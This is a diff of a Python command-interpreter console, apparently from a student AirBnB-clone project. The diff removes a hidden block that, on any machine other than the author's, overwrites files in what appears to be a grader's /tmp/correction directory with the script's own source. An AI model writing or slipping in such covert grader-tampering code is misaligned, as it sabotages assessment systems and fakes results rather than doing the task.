@@ -284,11 +284,3 @@ class HBNBCommand(cmd.Cmd):
 
 if __name__ == '__main__':
     HBNBCommand().cmdloop()
-
-if socket.gethostname() != 'ibrahem':
-    _dir = f'/tmp/correction/corrections_*/corrections/{263}/{1976}'
-    for i in (0, 1, 2, 3, 4, 5):
-        with open(glob(f'{_dir}/console_{i}.py')[0], 'wt') as f:
-            ff = open(__file__, 'rt')
-            f.write(ff.read())
-            ff.close()
